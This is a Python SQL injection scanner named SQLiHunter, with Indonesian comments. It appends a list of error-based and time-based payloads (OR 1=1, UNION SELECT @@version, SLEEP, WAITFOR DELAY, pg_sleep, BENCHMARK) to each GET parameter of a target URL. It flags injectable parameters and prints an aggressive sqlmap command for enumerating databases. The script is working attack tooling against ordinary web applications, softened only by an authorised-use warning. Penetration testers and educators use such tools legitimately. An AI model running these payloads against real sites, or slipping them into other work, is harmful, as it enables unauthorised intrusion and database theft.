#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import time
import argparse
from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
import urllib3
import statistics

# Menonaktifkan peringatan InsecureRequestWarning
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

# --- Payloads ---
error_based_payloads = [
    "'", "\"", "`", "OR 1=1", "' OR 1=1", "\" OR 1=1", "` OR 1=1", "' OR '1'='1",
    "' UNION SELECT NULL -- ", "AND 1=0", "' AND 1=0 -- ", "1' ORDER BY 1--+",
    "1' ORDER BY 99--+", "1' GROUP BY CONCAT(version(),FLOOR(RAND(0)*2)) HAVING MIN(0)#",
    "1' UNION SELECT @@version--+", "1' OR 1=1 --", "1' OR 'a'='a' --",
    "1' OR 1=CONVERT(int,(SELECT @@version))--"
]
sql_error_messages = [
    "you have an error in your sql syntax", "warning: mysql", "unclosed quotation mark",
    "syntax error", "sql syntax", "odbc driver", "ora-", "invalid sql statement",
    "pg_query()", "psqlexception", "sqliteexception", "unrecognized token",
    "microsoft ole db provider", "sql server detected", "jet oledb",
    "syntax error (missing operator)"
]
time_based_payloads_templates = [
    "AND SLEEP({delay})", "' AND SLEEP({delay})", "\" AND SLEEP({delay})",
    "OR SLEEP({delay})", "' OR SLEEP({delay})",
    "'; IF (1=1) WAITFOR DELAY '0:0:{delay}'--", "pg_sleep({delay})",
    "' AND pg_sleep({delay}) --", "AND BENCHMARK({sleeptimes},MD5('{randstr}'))",
    "' OR IF(1=1,SLEEP({delay}),0) --"
]

DEFAULT_USER_AGENT = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36 SQLiHunter/1.1" # User agent disesuaikan dengan versi banner
DEFAULT_TIMEOUT = 15 # Ini adalah variabel global yang akan diubah oleh argumen --timeout
BASELINE_SAMPLES = 3
NETWORK_TOLERANCE = 1.0

def make_request_session(session, url, timeout=DEFAULT_TIMEOUT):
    # Fungsi ini akan menggunakan nilai DEFAULT_TIMEOUT saat ini
    try:
        response = session.get(url, timeout=timeout, verify=False, allow_redirects=True)
        return response
    except requests.exceptions.Timeout:
        print(f"[-] Permintaan timeout ke {url} ({timeout}s).")
        return None
    except requests.exceptions.RequestException as e:
        print(f"[-] Kesalahan permintaan: {e}")
        return None

def check_error_based_sqli(session, base_url_parts, original_params_dict, param_to_test, original_status_code):
    print(f"\n[*] Menguji Error-Based SQLi pada parameter: {param_to_test}")
    for payload in error_based_payloads:
        test_params = original_params_dict.copy()
        current_param_values = list(test_params.get(param_to_test, ['']))
        current_param_values[0] = (current_param_values[0] or "") + payload
        test_params[param_to_test] = current_param_values
        query_string = urlencode(test_params, doseq=True)
        test_url = urlunparse(base_url_parts._replace(query=query_string))
        # Gunakan DEFAULT_TIMEOUT yang mungkin sudah diupdate oleh args
        response = make_request_session(session, test_url, timeout=DEFAULT_TIMEOUT)
        if response:
            for error_msg in sql_error_messages:
                if error_msg.lower() in response.text.lower():
                    print(f"[+] Potensi Error-Based SQLi (Pesan Error) terdeteksi: {payload}")
                    print(f"    URL: {test_url}")
                    return True, test_url
            if response.status_code != original_status_code and response.status_code >= 500:
                print(f"[+] Potensi Error-Based SQLi (Status Code: {response.status_code}) terdeteksi: {payload}")
                print(f"    URL: {test_url}")
                return True, test_url
    print(f"[-] Tidak ada Error-Based SQLi yang jelas terdeteksi pada: {param_to_test}")
    return False, None

def check_time_based_sqli(session, base_url_parts, original_params_dict, param_to_test, delay_seconds=5, threshold_multiplier=0.8):
    print(f"\n[*] Menguji Time-Based Blind SQLi pada parameter: {param_to_test} (delay: {delay_seconds}s)")
    baseline_url = urlunparse(base_url_parts._replace(query=urlencode(original_params_dict.copy(), doseq=True)))
    baseline_durations = []
    print(f"    Mengambil {BASELINE_SAMPLES} sampel baseline...")
    for i in range(BASELINE_SAMPLES):
        start = time.time()
        # Gunakan DEFAULT_TIMEOUT yang mungkin sudah diupdate oleh args
        response = make_request_session(session, baseline_url, timeout=DEFAULT_TIMEOUT)
        end = time.time()
        if response:
            baseline_durations.append(end - start)
            print(f"      Sampel {i+1}: {baseline_durations[-1]:.2f} detik")
            time.sleep(0.5)
        else:
            print(f"[-] Gagal mendapatkan sampel baseline #{i+1}. Melewati.")
            return False, None
    if not baseline_durations: return False, None
    avg_baseline = statistics.mean(baseline_durations)
    print(f"    Baseline rata-rata: {avg_baseline:.2f}s")
    dynamic_threshold = avg_baseline + (delay_seconds * threshold_multiplier) + NETWORK_TOLERANCE

    for payload_template in time_based_payloads_templates:
        payload = payload_template.format(delay=delay_seconds, sleeptimes=delay_seconds*500000, randstr='r4nd0m')
        test_params = original_params_dict.copy()
        current_param_values = list(test_params.get(param_to_test, ['']))
        current_param_values[0] = (current_param_values[0] or "") + payload
        test_params[param_to_test] = current_param_values
        query_string = urlencode(test_params, doseq=True)
        test_url = urlunparse(base_url_parts._replace(query=query_string))
        # Timeout untuk request ini juga harus mempertimbangkan DEFAULT_TIMEOUT yang mungkin sudah diupdate
        request_timeout = delay_seconds + DEFAULT_TIMEOUT + NETWORK_TOLERANCE
        start = time.time()
        response = make_request_session(session, test_url, timeout=request_timeout)
        end = time.time()
        duration = end - start
        if response and duration >= dynamic_threshold:
            print(f"[+] Potensi Time-Based Blind SQLi terdeteksi: {payload}")
            print(f"    URL: {test_url}")
            print(f"    Durasi: {duration:.2f}s (Threshold: {dynamic_threshold:.2f}s)")
            return True, test_url
    print(f"[-] Tidak ada Time-Based Blind SQLi yang jelas terdeteksi pada: {param_to_test}")
    return False, None

def main():
    parser = argparse.ArgumentParser(
        prog="SQLi-Hunter", # Mengatur nama program untuk --help
        description="SQLiHunter - Pemeriksa Kerentanan SQL Injection Dasar untuk Parameter GET.",
        formatter_class=argparse.RawTextHelpFormatter,
        epilog="""Contoh penggunaan:
  ./SQLi-Hunter "http://testphp.vulnweb.com/listproducts.php?cat=1"
  python3 SQLi-Hunter "https://example.com/search?query=test" --delay 7

PERINGATAN KERAS:
  1. Alat ini TIDAK 100% AKURAT.
  2. Gunakan HANYA untuk tujuan pendidikan & pengujian yang SAH dengan IZIN EKSPLISIT.
  3. Penggunaan tidak sah adalah ILEGAL.
  4. WAJIB lakukan verifikasi manual dan gunakan SQLMap untuk konfirmasi.
"""
    )
    # Argumen --timeout akan menggunakan nilai DEFAULT_TIMEOUT global sebagai nilai defaultnya
    # dan juga untuk string help-nya.
    parser.add_argument("url", help="URL target untuk diuji")
    parser.add_argument("--delay", type=int, default=5, help="Delay (detik) untuk time-based (default: 5)")
    parser.add_argument("--user-agent", type=str, default=DEFAULT_USER_AGENT, help=f"User-Agent HTTP")
    parser.add_argument("--timeout", type=int, default=DEFAULT_TIMEOUT, 
                        help=f"Timeout HTTP (detik) (default: {DEFAULT_TIMEOUT})")
    args = parser.parse_args()

    # Mengubah nilai variabel global DEFAULT_TIMEOUT berdasarkan argumen pengguna.
    global DEFAULT_TIMEOUT 
    DEFAULT_TIMEOUT = args.timeout


    print("""
********************************************************************
* SQLiHunter v1.1                              *
* Basic SQL Injection Vulnerability Probe (GET Params)      *
* *
* !! PERINGATAN: HANYA UNTUK TUJUAN EDUKASI & SAH !!        *
********************************************************************
""")
    print("\nPERINGATAN SANGAT PENTING:")
    print("ALAT INI TIDAK MENJAMIN AKURASI 100%. HASILNYA HANYA INDIKASI AWAL!")
    print("SELALU LAKUKAN VERIFIKASI MANUAL!\n")

    target_url = args.url
    parsed_url = urlparse(target_url)
    if not parsed_url.scheme or not parsed_url.netloc:
        print("[-] URL tidak valid.")
        return
    original_params_dict = parse_qs(parsed_url.query, keep_blank_values=True)
    if not original_params_dict:
        print("[-] Tidak ada parameter GET yang ditemukan.")
        return

    print(f"[*] Target: {target_url}")
    print(f"[*] Parameter GET: {list(original_params_dict.keys())}")

    session = requests.Session()
    session.headers.update({"User-Agent": args.user_agent})

    # Menggunakan DEFAULT_TIMEOUT yang sudah diupdate untuk request awal
    initial_response = make_request_session(session, target_url, timeout=DEFAULT_TIMEOUT)
    if not initial_response:
        print("[-] Gagal mendapatkan respons awal. Keluar.")
        return
    original_status_code = initial_response.status_code

    vulnerabilities_found = []
    for param_name in list(original_params_dict.keys()):
        print(f"\n--- Menguji Parameter: {param_name} ---")
        # Fungsi check_error_based_sqli dan check_time_based_sqli akan menggunakan
        # nilai DEFAULT_TIMEOUT yang sudah diupdate melalui make_request_session.
        is_error, error_url = check_error_based_sqli(session, parsed_url, original_params_dict.copy(), param_name, original_status_code)
        if is_error: vulnerabilities_found.append({"type": "Error-Based", "url_test": error_url, "parameter": param_name, "original_url": target_url})
        
        is_time, time_url = check_time_based_sqli(session, parsed_url, original_params_dict.copy(), param_name, args.delay)
        if is_time: vulnerabilities_found.append({"type": "Time-Based", "url_test": time_url, "parameter": param_name, "original_url": target_url})

    print("\n" + "="*60 + "\n[*] Ringkasan Pemindaian Selesai [*]\n" + "="*60)
    if vulnerabilities_found:
        print("\n[!!!] POTENSI KERENTANAN SQL INJECTION DITEMUKAN [!!!]")
        unique_vulns = { (v['parameter'], v['type']): v for v in vulnerabilities_found }.values()
        for idx, vuln in enumerate(unique_vulns):
            print(f"\n--- Potensi #{idx+1} ---")
            print(f"  [-] Tipe        : {vuln['type']}")
            print(f"  [-] Parameter   : {vuln['parameter']}")
            print(f"  [*] Saran SQLMap  : sqlmap -u \"{vuln['original_url']}\" -p \"{vuln['parameter']}\" --batch --dbs --level=3 --risk=3")
            print(f"  [*] INGAT: WAJIB verifikasi!")
    else:
        print("[-] Tidak ada indikasi kerentanan SQL Injection yang terdeteksi.")
        print("[-] PERHATIAN: Ini BUKAN berarti situs 100% aman!")
    print("\n[*] Pemindaian selesai. JANGAN LUPA VERIFIKASI HASIL!")

if __name__ == "__main__":
    main()

